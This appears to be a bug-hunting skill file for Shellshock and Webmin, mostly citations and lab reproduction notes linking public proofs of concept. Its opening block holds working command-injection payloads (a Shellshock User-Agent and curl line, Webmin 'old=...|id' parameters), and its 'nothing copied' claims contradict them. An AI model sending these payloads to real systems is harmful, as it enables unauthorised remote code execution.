---
# bughive-repro-start
cve:
  - CVE-2014-6271
  - CVE-2019-15107
repro: verified-public
references:
  - source: nvd
    id: CVE-2014-6271
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2014-6271"
    gave: "descriptions, configurations, 30 Exploit-tagged refs"
  - source: vendor
    id: CVE-2014-6271
    url: "http://jvn.jp/en/jp/JVN55667175/index.html"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2014-6271
    url: "https://github.com/advisories/GHSA-6hfc-grwp-2p9c"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2014-6271
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2022-01-28, dueDate 2022-07-28, knownRansomwareCampaignUse=Unknown"
  - source: exploitdb
    id: CVE-2014-6271
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/cgi/remote/38849.rb"
    gave: "public PoC (EDB-38849)"
  - source: poc-in-github
    id: CVE-2014-6271
    url: "https://github.com/opsxcq/exploit-CVE-2014-6271"
    gave: "public PoC repository"
  - source: nvd
    id: CVE-2019-15107
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-15107"
    gave: "descriptions, configurations, 10 Exploit-tagged refs"
  - source: vendor
    id: CVE-2019-15107
    url: "http://www.webmin.com/security.html"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    id: CVE-2019-15107
    url: "https://github.com/advisories/GHSA-69hp-hrv4-rxrr"
    gave: "advisory text; no package range"
  - source: cisa-kev
    id: CVE-2019-15107
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2022-03-25, dueDate 2022-04-15, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    id: CVE-2019-15107
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/remote/47230.rb"
    gave: "public PoC (EDB-47230)"
  - source: poc-in-github
    id: CVE-2019-15107
    url: "https://github.com/jas502n/CVE-2019-15107"
    gave: "public PoC repository"
# bughive-repro-end
---

# SKILL: shellshock-webmin
## ShellShock (CVE-2014-6271)
User-Agent: () { :; }; /bin/bash -c 'id'
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" https://target.com/cgi-bin/script.cgi
## Webmin (CVE-2019-15107)
v1.890: expired=id
<=v1.920 != v1.890: user=root&pam=&expired=2&old=vrvik|id&new1=vrvik&new2=vrvik
## Triage
RCE → Critical.

<!-- bughive-repro-start -->
## Steps to reproduce — CVE-2014-6271

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: gnu bash <= 4.3; arista eos >= 4.9.0, < 4.9.12; arista eos >= 4.10.0, < 4.10.9. NVD lists 228 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)]
- Weakness: CWE-78. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)]

### Input / trigger
- NVD characterizes the trigger as arbitrary code. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/cgi/remote/38849.rb)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as arbitrary code. Structured affected range: gnu bash <= 4.3. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/cgi/remote/38849.rb)]

### Public PoC (if any)
- EDB-38849 (verified flag 1): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/cgi/remote/38849.rb
- EDB-34777 (verified flag 1): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/cgi/remote/34777.rb
- EDB-39918 (verified flag 1): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/cgi/remote/39918.rb
- GHSA-listed: https://www.exploit-db.com/exploits/42938
- GHSA-listed: https://www.exploit-db.com/exploits/40938
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/opsxcq/exploit-CVE-2014-6271
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2014/CVE-2014-6271.json
- NVD Exploit-tagged reference: http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/128517/VMware-Security-Advisory-2014-0010.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2019-15107

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: webmin webmin <= 1.920. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)]
- Weakness: CWE-78. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)]

### Input / trigger
- NVD characterizes the trigger as privilege escalation. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/remote/47230.rb)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as privilege escalation. Structured affected range: webmin webmin <= 1.920. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/remote/47230.rb)]

### Public PoC (if any)
- EDB-47230 (verified flag 1): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/remote/47230.rb
- EDB-47293 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/webapps/47293.sh
- GHSA-listed: https://www.exploit-db.com/exploits/47230
- GHSA-listed: http://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/jas502n/CVE-2019-15107
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2019/CVE-2019-15107.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/154141/Webmin-1.920-Remote-Command-Execution.html
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/154141/Webmin-Remote-Comman-Execution.html

### What's missing
- (none for verified-public)
<!-- bughive-repro-end -->
